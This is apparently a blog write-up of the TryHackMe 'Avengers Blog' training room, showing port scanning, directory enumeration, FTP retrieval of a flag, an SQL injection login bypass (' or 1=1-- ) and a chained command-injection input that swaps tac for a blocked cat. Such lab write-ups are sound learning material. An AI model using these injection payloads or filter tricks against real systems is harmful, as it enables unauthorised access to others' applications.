---
title: THM{Avengers Blog}
author: Anugrah SR
date: 2020-12-1 01:30:00 +0800
categories: [Boot2root,Tryhackme]
tags: [ tryhackme, nmap, ftp, linux, rustscan, Gobuster, sqli]
math: true
image: "https://i.imgur.com/V9AE3D0.png"
---
# Avengers Blog
## About The Room
*.*<br>
* Url: https://tryhackme.com/room/avengers
* Creator: Tryhackme
* Difficulty: low

## Reconnaissance
### RustScan
```bash
rustscan -a 10.10.53.73 -- -A -sC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/cyph3r/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.53.73:21
Open 10.10.53.73:22
Open 10.10.53.73:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-01 12:51 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:51
Completed NSE at 12:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:51
Completed NSE at 12:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:51
Completed NSE at 12:51, 0.00s elapsed
Initiating Ping Scan at 12:51
Scanning 10.10.53.73 [2 ports]
Completed Ping Scan at 12:51, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:51
Completed Parallel DNS resolution of 1 host. at 12:51, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:51
Scanning 10.10.53.73 [3 ports]
Discovered open port 21/tcp on 10.10.53.73
Discovered open port 22/tcp on 10.10.53.73
Discovered open port 80/tcp on 10.10.53.73
Completed Connect Scan at 12:51, 0.18s elapsed (3 total ports)
Initiating Service scan at 12:51
Scanning 3 services on 10.10.53.73
Completed Service scan at 12:51, 6.37s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.53.73.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:51
Completed NSE at 12:51, 5.31s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:51
Completed NSE at 12:51, 1.29s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:51
Completed NSE at 12:51, 0.00s elapsed
Nmap scan report for 10.10.53.73
Host is up, received syn-ack (0.19s latency).
Scanned at 2020-12-01 12:51:03 EST for 14s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ce:cf:ed:89:a8:93:d9:35:e7:a3:66:2c:1c:aa:62:c1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDvY6u2fMFZhLhyK6Yy1XJkzvbdbFRZlf0ckCeKwSMQwOmgHj5V49zDSxzZUrikaqv0llB6afTybkS9Y5oqOxXP7MQizmgNV3UfcKXyjRQ9rAb0bCOK0hXzw9GLCO0p1mA7Ou6QBN7prSGwOvE6S2qWPk7qszIV99gVh4k4gcf3PtSgurBMjPs7CDvLIy3NtTw/2gLrM5izMSeNEBdlfchK5KuDPhFDHf1hKbcp6J2eXKv8X6XlylZNtg3svy9za0aHYg8n5XB8pwFX6m3bDi+5j/Eq3NAohlOTk18TvZx10d2C3iPVAR8m7c0zHDJYmRVKsCYJrn9D4CXQEuTAW+11
|   256 b6:f3:48:9a:08:92:27:6d:48:40:e9:a2:6e:66:5a:11 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBLrA1S/MVFE245nTmofW4LmHW4IKZhBU/h1BMoGlt8bctsJuR0r2kkhOwQMQKx2gIcYYezY/9z7g4uY4s1pRJM=
|   256 18:44:6b:f2:a6:12:c0:b2:3b:f3:61:fa:e3:19:fa:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII8KW8ZNoc1jczyxazPcBioJH3SW/ZyrRs/XKJrArK0J
80/tcp open  http    syn-ack Node.js Express framework
|_http-favicon: Unknown favicon MD5: E084507EB6547A72F9CEC12E0A9B7A36
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Avengers! Assemble!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:51
Completed NSE at 12:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:51
Completed NSE at 12:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:51
Completed NSE at 12:51, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.93 seconds
```
### http
![](https://imgur.com/eiXnydAl.png)
### Inspect Elements
#### flag1
![](https://imgur.com/AsqrftIl.png)
#### flag2
![](https://imgur.com/cjYOvWPl.png)
### FTP
```bash
ftp 10.10.53.73        
Connected to 10.10.53.73.
220 (vsFTPd 3.0.3)
Name (10.10.53.73:cyph3r): groot
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Oct 04  2019 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              33 Oct 04  2019 flag3.txt
226 Directory send OK.
```
#### flag3
```bash
ftp> get flag3.txt
local: flag3.txt remote: flag3.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag3.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (168.7255 kB/s)
ftp>
```
#### Gobuster
```bash
  gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.53.73/ -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.53.73/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2020/12/01 13:10:41 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 173] [--> /img/]
/home                 (Status: 302) [Size: 23] [--> /]     
/assets               (Status: 301) [Size: 179] [--> /assets/]
/Home                 (Status: 302) [Size: 23] [--> /]        
/portal               (Status: 200) [Size: 1409]              
/css                  (Status: 301) [Size: 173] [--> /css/]   
/js                   (Status: 301) [Size: 171] [--> /js/]    
/logout               (Status: 302) [Size: 29] [--> /portal]  
```
`/portal` looks interesting!
![](https://imgur.com/CbwLF1ml.png)
What's first thing comes to mind when you see a login panel!<br>
default creds? sqli? lets check. <br>
look what we have here in source code
![](https://imgur.com/iindPBMl.png)
#### Sqli
`' or 1=1-- `did the job!

![](https://imgur.com/icaC768l.png)
#### Command injection
#### flag5
cd ../; ls; cat flag5.txt
but `cat` is disallowed, need to find an alternative <br>
simple google search said `tac` can be used! its reverse of cat<br>
`cd ../; ls; tac flag5.txt`
![](https://imgur.com/LvJwmCUl.png)
